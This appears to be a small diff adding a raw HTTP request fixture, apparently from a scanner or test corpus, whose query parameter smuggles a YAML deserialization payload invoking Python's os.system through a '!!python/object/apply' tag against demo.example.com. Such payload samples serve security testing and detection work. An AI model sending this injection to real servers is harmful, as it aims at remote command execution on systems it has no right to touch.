@@ -1,0 +1,4 @@
+GET /a?id=ysaml%0aIO%0aDevice%0a%3D%0aYAML.load("!!python/object/apply:os.system") HTTP/1.1
+Host: demo.example.com
+Connection: close
+
